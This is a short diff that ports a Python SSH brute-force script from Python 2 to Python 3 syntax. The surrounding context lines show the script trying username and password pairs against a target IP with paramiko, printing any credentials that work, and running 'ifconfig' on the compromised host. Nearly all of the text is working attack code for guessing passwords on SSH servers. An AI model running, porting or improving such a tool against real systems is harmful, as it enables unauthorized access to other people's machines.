@@ -17,7 +17,7 @@ def ssh_connect(user,password,code=0):
 		ssh.connect(targetIP,port=22,username=user,password=password, timeout=5)
 	except paramiko.AuthenticationException:
 		code = 1
-	except Exception,e:
+	except Exception as e:
 		code = 2
 
 	ssh.close()
@@ -40,15 +40,15 @@ for user in users:
 				print("[*] User: %s [*] Pass Found:%s" %(user,password))
 				stdin,stdout,stderr = ssh.exec_command("ifconfig")
 				for line in stdout.readlines():
-					print line.strip()
+					print(line.strip())
 				#sys.exit(0)
 			elif response == 1:
 				print("[*] User: %s [*] Pass %s => Login incorrect !!!" %(user,password))
 			elif response == 2:
 				print("[*] Connection could not be established to %s" %(host))
 				#sys.exit(2)
-		except Exception,e:
-			print e
+		except Exception as e:
+			print(e)
 			pass
 			
 ud.close()
